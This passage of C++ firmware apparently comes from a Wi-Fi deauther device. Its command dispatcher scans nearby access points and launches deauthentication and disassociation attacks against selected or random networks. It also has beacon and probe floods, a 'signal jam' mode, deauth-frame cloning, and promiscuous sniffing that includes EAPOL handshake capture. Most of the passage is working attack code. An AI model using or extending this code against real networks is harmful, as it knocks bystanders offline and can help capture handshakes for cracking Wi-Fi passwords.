      if (val != 0) {
        out += (char)val;
      }
      i += 2;
    } else {
      out += c;
    }
  }
  return out;
}

String getQueryParam(const String &path, const String &key) {
  int q = path.indexOf('?');
  if (q < 0) return "";
  String query = path.substring(q + 1);
  String prefix = key + "=";
  int start = -1;
  for (int from = 0; from < (int)query.length(); ) {
    int pos = query.indexOf(prefix, from);
    if (pos < 0) break;
    // Accept the key only at the start or right after a '&', so that e.g.
    // "led" does not match inside "use_led".
    if (pos == 0 || query.charAt(pos - 1) == '&') {
      start = pos;
      break;
    }
    from = pos + 1;
  }
  if (start < 0) return "";
  start += prefix.length();
  int end = query.indexOf('&', start);
  if (end < 0) end = query.length();
  return urlDecode(query.substring(start, end));
}

String getPostValue(const String &body, const String &key) {
  String prefix = key + "=";
  int start = -1;
  for (int from = 0; from < (int)body.length(); ) {
    int pos = body.indexOf(prefix, from);
    if (pos < 0) break;
    if (pos == 0 || body.charAt(pos - 1) == '&') {
      start = pos;
      break;
    }
    from = pos + 1;
  }
  if (start < 0) return "";
  start += prefix.length();
  int end = body.indexOf('&', start);
  if (end < 0) end = body.length();
  return urlDecode(body.substring(start, end));
}

//==========================================================
// Config Validation Helpers (shared by CLI/BLE 'set' and HTTP /api/config)
//==========================================================
bool parseStrictLong(const String &s, long &out) {
  if (s.length() == 0) return false;
  const char *cstr = s.c_str();
  if (cstr[0] == '\0' || isspace((unsigned char)cstr[0])) return false;
  char *endPtr = nullptr;
  errno = 0;
  long val = strtol(cstr, &endPtr, 10);
  if (errno == ERANGE || endPtr == cstr || *endPtr != '\0') return false;
  out = val;
  return true;
}

bool hasFormKey(const String &body, const String &key) {
  String prefix = key + "=";
  for (int from = 0; from < (int)body.length(); ) {
    int pos = body.indexOf(prefix, from);
    if (pos < 0) return false;
    if (pos == 0 || body.charAt(pos - 1) == '&') return true;
    from = pos + 1;
  }
  return false;
}

bool validateConfigSetting(const String &key, const String &rawValue, String &errMsg) {
  String value = rawValue;
  value.replace(" ", "");
  long num = 0;
  if (key.equalsIgnoreCase("cycle_delay")) {
    if (!parseStrictLong(value, num) || num < 100 || num > 60000) {
      errMsg = "cycle_delay must be 100..60000 ms";
      return false;
    }
  } else if (key.equalsIgnoreCase("scan_time")) {
    if (!parseStrictLong(value, num) || num < 500 || num > 30000) {
      errMsg = "scan_time must be 500..30000 ms";
      return false;
    }
  } else if (key.equalsIgnoreCase("num_frames")) {
    if (!parseStrictLong(value, num) || num < 1 || num > 100) {
      errMsg = "num_frames must be 1..100";
      return false;
    }
  } else if (key.equalsIgnoreCase("start_channel")) {
    if (!parseStrictLong(value, num) || !(num == 1 || (num >= 36 && num <= 165))) {
      errMsg = "start_channel must be 1 or 36..165";
      return false;
    }
  } else if (key.equalsIgnoreCase("ap_ssid")) {
    if (rawValue.length() < 1 || rawValue.length() > 32) {
      errMsg = "AP SSID must be 1..32 bytes";
      return false;
    }
  } else if (key.equalsIgnoreCase("ap_pass")) {
    if (rawValue.length() < 8 || rawValue.length() > 63) {
      errMsg = "AP password must be 8..63 chars (WPA2)";
      return false;
    }
  } else if (key.equalsIgnoreCase("ble_name")) {
    if (rawValue.length() < 1 || rawValue.length() > 26) {
      errMsg = "BLE name must be 1..26 bytes";
      return false;
    }
  } else if (key.equalsIgnoreCase("scan_cycles") || key.equalsIgnoreCase("led")) {
    if (!value.equalsIgnoreCase("on") && !value.equalsIgnoreCase("off")) {
      errMsg = key + " must be on or off";
      return false;
    }
  }
  return true;
}

bool applyConfigSetting(const String &key, const String &rawValue, bool &apChanged) {
  String value = rawValue;
  value.replace(" ", "");
  long num = 0;
  if (key.equalsIgnoreCase("cycle_delay")) {
    parseStrictLong(value, num);
    cycle_delay = (unsigned long)num;
    return true;
  } else if (key.equalsIgnoreCase("scan_time")) {
    parseStrictLong(value, num);
    scan_time = (unsigned long)num;
    return true;
  } else if (key.equalsIgnoreCase("num_frames")) {
    parseStrictLong(value, num);
    num_send_frames = (unsigned long)num;
    return true;
  } else if (key.equalsIgnoreCase("start_channel")) {
    parseStrictLong(value, num);
    start_channel = (int)num;
    return true;
  } else if (key.equalsIgnoreCase("scan_cycles")) {
    scan_between_cycles = value.equalsIgnoreCase("on");
    return true;
  } else if (key.equalsIgnoreCase("led")) {
    USE_LED = value.equalsIgnoreCase("on");
    if (!USE_LED) {
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
    }
    return true;
  } else if (key.equalsIgnoreCase("ap_ssid")) {
    if (String(ap_ssid) != rawValue) {
      strncpy(ap_ssid, rawValue.c_str(), sizeof(ap_ssid) - 1);
      ap_ssid[sizeof(ap_ssid) - 1] = '\0';
      apChanged = true;
    }
    Serial.println("[CFG] AP SSID updated to: " + String(ap_ssid));
    return true;
  } else if (key.equalsIgnoreCase("ap_pass")) {
    if (String(ap_pass) != rawValue) {
      strncpy(ap_pass, rawValue.c_str(), sizeof(ap_pass) - 1);
      ap_pass[sizeof(ap_pass) - 1] = '\0';
      apChanged = true;
    }
    Serial.println("[CFG] AP password updated.");
    return true;
  } else if (key.equalsIgnoreCase("ble_name")) {
    updateBleName(rawValue.c_str());
    Serial.println("[CFG] BLE name updated to: " + String(ble_name));
    return true;
  }
  return false;
}

//==========================================================
//==========================================================
// Target Selection & Command Execution
//==========================================================
bool hasSelectedTargetsSafe() {
  bool ok = false;
  if (lockScanMutex()) {
    ok = (target_mode && !target_aps.empty());
    unlockScanMutex();
  }
  return ok;
}

bool applyTargetSpec(const String &rawSpec, bool allowClearEmpty, String &errMsg) {
  String spec = rawSpec;
  spec.replace(" ", "");
  spec.trim();

  if (spec.length() == 0) {
    if (!allowClearEmpty) {
      errMsg = "No target indices provided.";
      return false;
    }
    if (lockScanMutex()) {
      target_aps.clear();
      target_mode = false;
      for (size_t i = 0; i < scan_results.size(); i++) {
        scan_results[i].selected = false;
      }
      unlockScanMutex();
    }
    deauthSlice.reset();
    disassocSlice.reset();
    return true;
  }

  if (spec.equalsIgnoreCase("all")) {
    bool ok = false;
    if (lockScanMutex()) {
      if (scan_results.empty()) {
        errMsg = "No scan results available. Run 'scan' first.";
      } else {
        target_aps.clear();
        target_mode = false;
        for (size_t i = 0; i < scan_results.size(); i++) {
          scan_results[i].selected = true;
          target_aps.push_back(scan_results[i]);
        }
        target_mode = !target_aps.empty();
        ok = target_mode;
      }
      unlockScanMutex();
    }
    if (ok) {
      deauthSlice.reset();
      disassocSlice.reset();
    }
    return ok;
  }

  std::vector<long> parsedIndices;
  int start = 0;
  while (start <= (int)spec.length()) {
    int end = spec.indexOf(',', start);
    String tok = (end == -1) ? spec.substring(start) : spec.substring(start, end);
    tok.trim();
    if (tok.length() == 0) {
      errMsg = "Empty token in target index list.";
      return false;
    }
    long parsedIdx = -1;
    if (!parseStrictLong(tok, parsedIdx) || parsedIdx < 0) {
      errMsg = "Invalid target index: " + tok;
      return false;
    }
    parsedIndices.push_back(parsedIdx);
    if (end == -1) break;
    start = end + 1;
  }
  if (parsedIndices.empty()) {
    errMsg = "No valid target indices provided.";
    return false;
  }

  bool ok = false;
  if (lockScanMutex()) {
    if (scan_results.empty()) {
      errMsg = "No scan results available. Run 'scan' first.";
    } else {
      bool allInRange = true;
      for (size_t k = 0; k < parsedIndices.size(); k++) {
        if (parsedIndices[k] < 0 || parsedIndices[k] >= (long)scan_results.size()) {
          errMsg = "Target index out of range: " + String(parsedIndices[k]);
          allInRange = false;
          break;
        }
      }
      if (allInRange) {
        target_aps.clear();
        target_mode = false;
        for (size_t i = 0; i < scan_results.size(); i++) {
          scan_results[i].selected = false;
        }
        for (size_t k = 0; k < parsedIndices.size(); k++) {
          size_t idx = (size_t)parsedIndices[k];
          if (!scan_results[idx].selected) {
            scan_results[idx].selected = true;
            target_aps.push_back(scan_results[idx]);
          }
        }
        target_mode = !target_aps.empty();
        ok = target_mode;
      }
    }
    unlockScanMutex();
  }
  if (ok) {
    deauthSlice.reset();
    disassocSlice.reset();
  }
  return ok;
}

bool parseSniffTimeCmd(const String &command, unsigned long &durOut, SniffMode &modeOut, String &errMsg) {
  String rest = command.substring(11);
  rest.trim();
  int sp = rest.indexOf(' ');
  String durStr = (sp > 0) ? rest.substring(0, sp) : rest;
  durStr.trim();
  String modeStr = (sp > 0) ? rest.substring(sp + 1) : "all";
  modeStr.trim();
  long dur = 0;
  if (!parseStrictLong(durStr, dur) || dur <= 0) {
    errMsg = "Invalid sniff_time duration: " + durStr;
    return false;
  }
  SniffMode mode = SNIFF_ALL;
  if (modeStr.equalsIgnoreCase("all")) mode = SNIFF_ALL;
  else if (modeStr.equalsIgnoreCase("beacon")) mode = SNIFF_BEACON;
  else if (modeStr.equalsIgnoreCase("probe")) mode = SNIFF_PROBE;
  else if (modeStr.equalsIgnoreCase("deauth")) mode = SNIFF_DEAUTH;
  else if (modeStr.equalsIgnoreCase("eapol")) mode = SNIFF_EAPOL;
  else if (modeStr.equalsIgnoreCase("pwnagotchi")) mode = SNIFF_PWNAGOTCHI;
  else {
    errMsg = "Unknown sniff_time mode: " + modeStr;
    return false;
  }
  durOut = (unsigned long)dur;
  modeOut = mode;
  return true;
}

static bool failCmd(String *errOut, const String &msg, bool pushStatus = false) {
  if (errOut) *errOut = msg;
  Serial.println("[ERROR] " + msg);
  bleSendLog("[ERROR] " + msg);
  if (pushStatus) blePushStatus();
  return false;
}

bool executeCommand(String command, String *errOut, bool fromHttp) {
  command.trim();
  if (command.length() == 0) {
    if (errOut) *errOut = "Empty command";
    return false;
  }

  if (command.equalsIgnoreCase("ap off")) {
    // 决策 B：禁止通过 WebUI/HTTP 执行永久关闭热点的 ap off，仅允许 BLE/Serial
    if (fromHttp) {
      if (errOut) *errOut = "'ap off' is disabled over WebUI/HTTP; use BLE or Serial instead.";
      Serial.println("[WARN] Rejected HTTP 'ap off' per Decision B.");
      return false;
    }
    stopAllActiveAttacks();
    haltPromiscSniff();
    apEnabled = false;
    bool staOk = enterStaMode("ap off");
    blePushInfo();
    blePushStatus();
    if (staOk) {
      Serial.println("[INFO] AP + WebUI disabled. BLE-only stealth mode (STA active).");
    } else {
      Serial.println("[WARN] AP + WebUI disabled, but STA initialization failed.");
    }
    return true;
  }
  else if (command.equalsIgnoreCase("ap on")) {
    bool sniffingNow = false;
    rtw_enter_critical(NULL, NULL);
    sniffingNow = (isSniffing || deauth_sniff_enabled);
    rtw_exit_critical(NULL, NULL);
    if (!sniffingNow && apEnabled && isSoftApHealthy()) {
      // Idempotent path: avoid tearing down live SoftAP associations & BT PTA coex when already healthy
      if (!webServerRunning() && !startWebServer(3)) {
        if (errOut) *errOut = "WebServer port 80 bind failed";
        return false;
      }
      blePushInfo();
      blePushStatus();
      Serial.println("[INFO] AP + WebUI already active.");
      return true;
    }
    stopAllActiveAttacks();
    haltPromiscSniff();
    bool ok = startSoftAP();
    blePushInfo();
    blePushStatus();
    if (ok) {
      Serial.println("[INFO] AP + WebUI re-enabled.");
      return true;
    }
    if (errOut) *errOut = "Failed to start SoftAP / WebServer";
    Serial.println("[ERROR] AP + WebUI recovery failed.");
    return false;
  }
  else if (command.equalsIgnoreCase("start deauther") || startsWithIgnoreCase(command, "start deauther ")) {
    String spec = (command.length() > 14) ? command.substring(15) : "";
    spec.trim();
    if (spec.length() > 0) {
      String errMsg;
      if (!applyTargetSpec(spec, false, errMsg)) {
        return failCmd(errOut, errMsg, true);
      }
    } else if (!hasSelectedTargetsSafe()) {
      // 决策 A：禁止无目标时默认全攻
      return failCmd(errOut, "No targets selected. Select targets or use 'start deauther all'.", true);
    }
    stopConflictingModesBeforeAttack();
    if (!priorityStopPending) {
      emergencyStopRequested = false;
    }
    deauthSlice.reset();
    attack_enabled = true;
    blePushStatus();
    Serial.println("[INFO] Deauthentication Attack started.");
    return true;
  }
  else if (command.equalsIgnoreCase("stop deauther") || command.equalsIgnoreCase("stop") || command.equalsIgnoreCase("stop all")) {
    // Universal stop: kill every attack and restore the soft AP (if apEnabled)
    stopAllActiveAttacks();
    clearDeauthSniffState();
    bool sniffActive = false;
    rtw_enter_critical(NULL, NULL);
    sniffActive = (isSniffing || deauth_sniff_enabled);
    rtw_exit_critical(NULL, NULL);
    if (sniffActive) { stopSniffing(); }  // restores AP or STA based on apEnabled
    restoreDefaultChannelIfNeeded(true);
    if (!priorityStopPending) {
      emergencyStopRequested = false;
    }
    blePushStatus();
    Serial.println("[INFO] All attacks stopped.");
    return true;
  }
  else if (command.equalsIgnoreCase("scan")) {
    if (!priorityStopPending) {
      emergencyStopRequested = false;
    }
    stopConflictingModesBeforeAttack();
    if (lockScanMutex()) {
      target_aps.clear();
      target_mode = false;
      unlockScanMutex();
    }
    cancelBleScanPush();
    scan_enabled = true;
    Serial.println("[INFO] Starting scan...");
    bleSendLine("{\"t\":\"scan_begin\"}");
    if (scanNetworks(false, false) == 0) {
      printScanResults();
      scan_enabled = false;
      Serial.println("[INFO] Scan completed.");
      return true;
    }
    else {
      cancelBleScanPush();
      scan_enabled = false;
      Serial.println("[ERROR] Scan failed.");
      bleSendLine("{\"t\":\"scan_end\",\"n\":0,\"err\":1}");
      bleSendLog("[ERROR] Wi-Fi scan failed.");
      if (errOut) *errOut = "Wi-Fi scan failed.";
      return false;
    }
  }
  else if (command.equalsIgnoreCase("results")) {
    if (getScanCountSafe() > 0) {
      printScanResults();
    }
    else {
      Serial.println("[INFO] No scan results available. Try 'scan' first.");
    }
    // 即使结果为空也向 BLE 推送 sync_begin/sync_end(n=0)，让重连后的 App 同步热点列表与已选目标
    blePushScanResults(true, true);
    return true;
  }
  else if (startsWithIgnoreCase(command, "attack_time ")) {
    String rest = command.substring(12);
    rest.trim();
    int sp = rest.indexOf(' ');
    String valStr = (sp > 0) ? rest.substring(0, sp) : rest;
    valStr.trim();
    String spec = (sp > 0) ? rest.substring(sp + 1) : "";
    spec.trim();
    long durationMs = 0;
    if (!parseStrictLong(valStr, durationMs) || durationMs <= 0) {
      return failCmd(errOut, "Invalid attack_time duration: " + valStr, true);
    }
    if (spec.length() > 0) {
      String errMsg;
      if (!applyTargetSpec(spec, false, errMsg)) {
        return failCmd(errOut, errMsg, true);
      }
    } else if (!hasSelectedTargetsSafe()) {
      // 决策 A：无目标时拒绝定时全攻
      return failCmd(errOut, "No targets selected. Select targets or use 'attack_time <ms> all'.", true);
    }
    stopConflictingModesBeforeAttack();
    if (!priorityStopPending) {
      emergencyStopRequested = false;
    }
    deauthSlice.reset();
    startTimedAttack((unsigned long)durationMs);
    blePushStatus();
    Serial.println("[INFO] Timed attack started for " + String(durationMs) + " ms.");
    return true;
  }
  else if (command.equalsIgnoreCase("disassoc") || startsWithIgnoreCase(command, "disassoc ")) {
    String spec = (command.length() > 8) ? command.substring(9) : "";
    spec.trim();
    if (spec.length() > 0) {
      String errMsg;
      if (!applyTargetSpec(spec, false, errMsg)) {
        return failCmd(errOut, errMsg, true);
      }
      stopConflictingModesBeforeAttack();
      if (!priorityStopPending) {
        emergencyStopRequested = false;
      }
      disassocSlice.reset();
      disassoc_enabled = true;
      blePushStatus();
      Serial.println("[INFO] Continuous Disassociation Attack started.");
      return true;
    } else if (disassoc_enabled) {
      disassoc_enabled = false;
      disassocSlice.reset();
      restoreDefaultChannelIfNeeded(false);
      if (USE_LED) digitalWrite(LED_B, LOW);
      blePushStatus();
      Serial.println("[INFO] Disassociation Attack stopped.");
      return true;
    } else {
      if (!hasSelectedTargetsSafe()) {
        // 决策 A：未选目标禁止无参 disassoc 回退全攻
        return failCmd(errOut, "No targets selected. Select targets or use 'disassoc all'.", true);
      }
      stopConflictingModesBeforeAttack();
      if (!priorityStopPending) {
        emergencyStopRequested = false;
      }
      disassocSlice.reset();
      disassoc_enabled = true;
      blePushStatus();
      Serial.println("[INFO] Continuous Disassociation Attack started.");
      return true;
    }
  }
  else if (command.equalsIgnoreCase("random_attack")) {
    std::vector<WiFiScanResult> snap = snapshotScanResults();
    if (!snap.empty()) {
      stopConflictingModesBeforeAttack();
      if (!priorityStopPending) {
        emergencyStopRequested = false;
      }
      size_t idx = (size_t)random(0, snap.size());
      uint8_t randChannel = (uint8_t)snap[idx].channel;
      if (wifi_set_channel(randChannel) != RTW_SUCCESS) {
        Serial.print("[WARN] wifi_set_channel(");
        Serial.print(randChannel);
        Serial.println(") failed");
        bleSendLog("[WARN] Switch channel CH " + String(randChannel) + " failed");
        if (errOut) *errOut = "Failed to switch channel CH " + String(randChannel);
        blePushStatus();
        return false;
      } else {
        setCurrentChannelSafe(randChannel);
        for (unsigned long j = 0; j < num_send_frames; j++) {
          if (shouldAbortCycle()) break;
          uint16_t reason = deauth_reasons[j % num_deauth_reasons];
          wifi_tx_deauth_frame(snap[idx].bssid, dst_mac, reason);
          wifi_tx_disassoc_frame(snap[idx].bssid, dst_mac, disassoc_reasons[j % num_disassoc_reasons]);
          delay(1);
        }
        restoreDefaultChannelIfNeeded(false);
        String msg = "[RANDOM ATTACK] => " + snap[idx].ssid + " (CH " + String(randChannel) + ")";
        Serial.println(msg);
        bleSendLog(msg);
        blePushStatus();
        return true;
      }
    } else {
      return failCmd(errOut, "No scan results. Run 'scan' first.", true);
    }
  }
  //==========================
  // Flood / Jam / Sniff-clone attacks (merged from upstream v1.0.3)
  //==========================
  else if (command.equalsIgnoreCase("beacon_flood") || command.equalsIgnoreCase("beacon flood")) {
    if (beacon_flood_enabled) {
      beacon_flood_enabled = false;
      Serial.println("[INFO] Beacon flood stopped.");
    } else {
      stopConflictingModesBeforeAttack();
      if (!priorityStopPending) {
        emergencyStopRequested = false;
      }
      beacon_flood_enabled = true;
      beacon_flood_count = 0;
      Serial.println("[INFO] Beacon flood started.");
    }
    blePushStatus();
    return true;
  }
  else if (command.equalsIgnoreCase("probe_flood") || command.equalsIgnoreCase("probe flood")) {
    if (probe_flood_enabled) {
      probe_flood_enabled = false;
      Serial.println("[INFO] Probe flood stopped.");
    } else {
      stopConflictingModesBeforeAttack();
      if (!priorityStopPending) {
        emergencyStopRequested = false;
      }
      probe_flood_enabled = true;
      probe_flood_count = 0;
      Serial.println("[INFO] Probe flood started.");
    }
    blePushStatus();
    return true;
  }
  else if (command.equalsIgnoreCase("signal_jam") || command.equalsIgnoreCase("signal jam")) {
    if (signal_jam_enabled) {
      signal_jam_enabled = false;
      restoreDefaultChannelIfNeeded(true);
      if (USE_LED) digitalWrite(LED_B, LOW);
      Serial.println("[INFO] Signal jam stopped.");
    } else {
      stopConflictingModesBeforeAttack();
      if (!priorityStopPending) {
        emergencyStopRequested = false;
      }
      signal_jam_enabled = true;
      signal_jam_count = 0;
      signal_jam_ch_index = 0;
      Serial.println("[INFO] Signal jam started - rapid channel cycling + deauth.");
    }
    blePushStatus();
    return true;
  }
  else if (command.equalsIgnoreCase("deauth_sniff") || command.equalsIgnoreCase("deauth sniff")) {
    bool alreadyDeauthSniff = false;
    bool alreadySniffing = false;
    rtw_enter_critical(NULL, NULL);
    alreadyDeauthSniff = deauth_sniff_enabled;
    alreadySniffing = isSniffing;
    rtw_exit_critical(NULL, NULL);

    if (alreadyDeauthSniff) {
      stopSniffing();  // clears deauth_sniff_enabled, restores hopping, restores AP or STA
      Serial.println("[INFO] Deauth sniff stopped.");
      blePushStatus();
      return true;
    } else {
      stopAllActiveAttacks();
      if (!priorityStopPending) {
        emergencyStopRequested = false;
      }
      timedSniffEnabled = false;
      if (alreadySniffing) {
        haltPromiscSniff();
      }
      resetPromiscLogThrottle();
      // Close listening socket cleanly and reuse active STA if already in BLE-only STA mode
      int wextMode = -1;
      bool alreadySta = (!apEnabled &&
                       wlanRuntimeMode == WLAN_MODE_STA &&
                       wifi_is_up(RTW_STA_INTERFACE) &&
                       !wifi_is_up(RTW_AP_INTERFACE) &&
                       wext_get_mode(WLAN0_NAME, &wextMode) == RTW_SUCCESS &&
                       wextMode == RTW_MODE_INFRA);
      if (!alreadySta) {
        prepareRadioForSniff(true);
        feedWatchdog();
        if (wifi_on(RTW_MODE_STA) != RTW_SUCCESS) {
          wlanRuntimeMode = WLAN_MODE_UNINIT;
          Serial.println("[ERROR] wifi_on(RTW_MODE_STA) failed for deauth_sniff.");
          if (apEnabled) {
            startSoftAP();
          } else {
            restoreBleCoex(false);
          }
          blePushStatus();
          if (errOut) *errOut = "wifi_on(RTW_MODE_STA) failed";
          return false;
        }
        feedWatchdog();
        wlanRuntimeMode = WLAN_MODE_STA;
      }
      WiFi.disablePowerSave();
      restoreBleCoex(!alreadySta);
      resetHopState();
      deauth_sniff_prev_hop = isHopping;
      isHopping = true;
      int chSnap = getCurrentChannelSafe();
      if (!setChannel(chSnap)) {
        Serial.println("[WARN] deauth_sniff failed to set initial channel " + String(chSnap) + "; hopChannel will retry.");
      }

      // 先置好全部状态位再注册回调，避免首波回调漏检或状态撕裂
      rtw_enter_critical(NULL, NULL);
      currentMode = SNIFF_DEAUTH;
      isSniffing = true;
      deauth_sniff_enabled = true;
      has_sniffed_deauth = false;
      sniffed_deauth_ch = currentChannel;
      rtw_exit_critical(NULL, NULL);

      if (wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_callback, 1) != RTW_SUCCESS) {
        rtw_enter_critical(NULL, NULL);
        isSniffing = false;
        deauth_sniff_enabled = false;
        currentMode = SNIFF_STOP;
        isHopping = deauth_sniff_prev_hop;
        deauth_sniff_prev_hop = false;
        rtw_exit_critical(NULL, NULL);
        Serial.println("[ERROR] wifi_set_promisc failed for deauth_sniff.");
        restoreRadioAfterSniff();
        blePushStatus();
        if (errOut) *errOut = "wifi_set_promisc failed";
        return false;
      } else {
        Serial.println("[INFO] Deauth sniff started - auto-hopping 2.4G/5G to clone deauth frames.");
        bleSendLog("[INFO] Deauth 克隆嗅探已启动 (自动双频跳频监听)");
        blePushStatus();
        return true;
      }
    }
  }
  else if (startsWithIgnoreCase(command, "single_ap ") ||
           startsWithIgnoreCase(command, "single ap ") ||
           command.equalsIgnoreCase("single_ap") ||
           command.equalsIgnoreCase("single ap")) {
    std::vector<WiFiScanResult> snap = snapshotScanResults();
    if (snap.empty()) {
      return failCmd(errOut, "No scan results. Run 'scan' first.");
    } else if (command.length() <= 10) {
      return failCmd(errOut, "Missing AP index. Usage: single_ap <index>");
    } else {
      String idxStr = command.substring(10);
      idxStr.trim();
      long idx = -1;
      if (!parseStrictLong(idxStr, idx) || idx < 0 || idx >= (long)snap.size()) {
        return failCmd(errOut, "Invalid single_ap index: " + idxStr);
      } else {
        stopConflictingModesBeforeAttack();
        if (!priorityStopPending) {
          emergencyStopRequested = false;
        }
        if (wifi_set_channel(snap[(size_t)idx].channel) != RTW_SUCCESS) {
          Serial.print("[WARN] wifi_set_channel(");
          Serial.print(snap[(size_t)idx].channel);
          Serial.println(") failed");
          bleSendLog("[WARN] Switch CH " + String(snap[(size_t)idx].channel) + " failed");
          if (errOut) *errOut = "Failed to switch channel";
          blePushStatus();
          return false;
        } else {
          setCurrentChannelSafe((int)snap[(size_t)idx].channel);
          for (unsigned long j = 0; j < num_send_frames; j++) {
            if (shouldAbortCycle()) break;
            wifi_tx_deauth_frame(snap[(size_t)idx].bssid, dst_mac, deauth_reasons[j % num_deauth_reasons]);
            wifi_tx_disassoc_frame(snap[(size_t)idx].bssid, dst_mac, disassoc_reasons[j % num_disassoc_reasons]);
            delay(1);
          }
          restoreDefaultChannelIfNeeded(false);
          String msg = "[SINGLE AP] Attacked " + snap[(size_t)idx].ssid + " on CH " + String(snap[(size_t)idx].channel);
          Serial.println(msg);
          bleSendLog(msg);
          blePushStatus();
          return true;
        }
      }
    }
  }
  else if (command.equalsIgnoreCase("tx_stats")) {
    String statsMsg = "TX Stats: " + String(tx_success_count) + " OK / " + String(tx_fail_count) + " FAIL";
    Serial.println(statsMsg);
    bleSendLog(statsMsg);
    blePushStatus();
    return true;
  }
  else if (command.equalsIgnoreCase("reset_txstats")) {
    tx_success_count = 0;
    tx_fail_count = 0;
    seq_num_counter = 1;
    blePushStatus();
    Serial.println("[TX STATS] Reset.");
    return true;
  }
  else if (command.equalsIgnoreCase("start sniff")) {
    startMonitorSniff(SNIFF_ALL);
    blePushStatus();
    return true;
  }
  else if (command.equalsIgnoreCase("hop on")) {
    resetHopState();
    isHopping = true;
    blePushStatus();
    return true;
  }
  else if (command.equalsIgnoreCase("hop off")) {
    isHopping = false;
    blePushStatus();
    return true;
  }
  else if (startsWithIgnoreCase(command, "set ch ")) {
    String chStr = command.substring(7);
    chStr.trim();
    long newChannelLong = -1;
    bool validChannel = false;
    if (parseStrictLong(chStr, newChannelLong)) {
      int newChannel = (int)newChannelLong;
      for (int ch : CHANNELS_2GHZ) { if (ch == newChannel) validChannel = true; }
      for (int ch : CHANNELS_5GHZ) { if (ch == newChannel) validChannel = true; }
    }
    if (validChannel) {
      bool sniffingNow = false;
      rtw_enter_critical(NULL, NULL);
      sniffingNow = isSniffing;
      rtw_exit_critical(NULL, NULL);
      if ((softApActive || apEnabled) && !sniffingNow) {
        if (errOut) *errOut = "SoftAP active on CH 1; start sniff or run 'ap off' before locking channel.";
        Serial.println("[WARN] SoftAP active on CH 1; start sniff or run 'ap off' before locking channel.");
        bleSendLog("[WARN] 当前热点开启中，请先开始抓包或关闭热点后再锁频");
        return false;
      } else {
        isHopping = false;
        useCustomChannels = false;
        if (!setChannel((int)newChannelLong)) {
          bleSendLog("[WARN] 切换信道 CH " + String((int)newChannelLong) + " 失败");
          if (errOut) *errOut = "Failed to switch channel";
          blePushStatus();
          return false;
        }
        blePushStatus();
        return true;
      }
    } else {
      return failCmd(errOut, "Invalid channel: " + chStr);
    }
  }
  else if (command.equalsIgnoreCase("sniff beacon")) { startMonitorSniff(SNIFF_BEACON); blePushStatus(); return true; }
  else if (command.equalsIgnoreCase("sniff probe")) { startMonitorSniff(SNIFF_PROBE); blePushStatus(); return true; }
  else if (command.equalsIgnoreCase("sniff deauth")) { startMonitorSniff(SNIFF_DEAUTH); blePushStatus(); return true; }
  else if (command.equalsIgnoreCase("sniff eapol")) { startMonitorSniff(SNIFF_EAPOL); blePushStatus(); return true; }
  else if (command.equalsIgnoreCase("sniff pwnagotchi")) { startMonitorSniff(SNIFF_PWNAGOTCHI); blePushStatus(); return true; }
  else if (command.equalsIgnoreCase("sniff all")) { startMonitorSniff(SNIFF_ALL); blePushStatus(); return true; }
  else if (command.equalsIgnoreCase("stop sniff")) { stopSniffing(); blePushStatus(); return true; }
  else if (startsWithIgnoreCase(command, "sniff_time ")) {
    unsigned long dur = 0;
    SniffMode mode = SNIFF_ALL;
    String errMsg;
    if (!parseSniffTimeCmd(command, dur, mode, errMsg)) {
      return failCmd(errOut, errMsg);
    }
    startMonitorSniff(mode, true, dur);
    blePushStatus();
    Serial.println("[INFO] Timed sniff started for " + String(dur) + " ms.");
    return true;
  }
  else if (command.equalsIgnoreCase("clear_logs")) {
    rtw_enter_critical(NULL, NULL);
    webLogHead = 0;
    webLogCount = 0;
    logHead = 0;
    logTail = 0;
    droppedLogCount = 0;
    rtw_exit_critical(NULL, NULL);
    Serial.println("[INFO] Sniff logs cleared.");
    bleSendLog("[INFO] Sniff logs cleared.");
    return true;
  }
  else if (startsWithIgnoreCase(command, "set ")) {
    String setting = command.substring(4);
    setting.trim();
    int space_index = setting.indexOf(' ');
    if (space_index != -1) {
      String key = setting.substring(0, space_index);
      String rawValue = setting.substring(space_index + 1);
      rawValue.trim();

      String errMsg = "";
      if (key.equalsIgnoreCase("cycle_delay") ||
          key.equalsIgnoreCase("scan_time") ||
          key.equalsIgnoreCase("num_frames") ||
          key.equalsIgnoreCase("start_channel") ||
          key.equalsIgnoreCase("scan_cycles") ||
          key.equalsIgnoreCase("led") ||
          key.equalsIgnoreCase("ap_ssid") ||
          key.equalsIgnoreCase("ap_pass") ||
          key.equalsIgnoreCase("ble_name")) {
        if (!validateConfigSetting(key, rawValue, errMsg)) {
          blePushInfo();
          return failCmd(errOut, errMsg);
        } else {
          bool apChanged = false;
          applyConfigSetting(key, rawValue, apChanged);
          saveConfigToFlash();
          if (apChanged) scheduleApRestart();
          blePushInfo();
          return true;
        }
      }
      else if (key.equalsIgnoreCase("target")) {
        if (!applyTargetSpec(rawValue, rawValue.length() == 0, errMsg)) {
          blePushStatus();
          return failCmd(errOut, errMsg);
        }
        blePushStatus();
        return true;
      }
      else {
        return failCmd(errOut, "Unknown setting key: " + key);
      }
    }
    else if (setting.equalsIgnoreCase("target")) {
      String errMsg;
      applyTargetSpec("", true, errMsg);
      blePushStatus();
      return true;
    } else {
      return failCmd(errOut, "Invalid set syntax: " + setting);
    }
  }
  else if (command.equalsIgnoreCase("reset_config")) {
    bool apChanged = (strcmp(ap_ssid, DEFAULT_WIFI_SSID) != 0 || strcmp(ap_pass, DEFAULT_WIFI_PASS) != 0);
    strcpy(ap_ssid, DEFAULT_WIFI_SSID);
    strcpy(ap_pass, DEFAULT_WIFI_PASS);
    updateBleName(DEFAULT_BLE_NAME);
    cycle_delay = 2000;
    scan_time = 5000;
    num_send_frames = 3;
    start_channel = 1;
    scan_between_cycles = false;
    USE_LED = true;
    saveConfigToFlash();
    blePushInfo();
    if (apChanged) scheduleApRestart();
    Serial.println("[CFG] Restored factory default configuration.");
    return true;
  }
  else if (command.equalsIgnoreCase("info")) {
    Serial.println("[INFO] SSID=" + String(ap_ssid) + " BLE=" + String(ble_name) + " cycle_delay=" + String(cycle_delay) + " scan_time=" + String(scan_time) + " frames=" + String(num_send_frames));
    blePushInfo();
    return true;
  }
  else if (command.equalsIgnoreCase("help")) {
    Serial.println("Scan & Info: scan, results, info, help, tx_stats, reset_txstats");
    Serial.println("Attack: start deauther [<i,j|all>], disassoc [<i,j|all>], single_ap <index>, random_attack, attack_time <ms> [<i,j|all>], stop [all|deauther]");
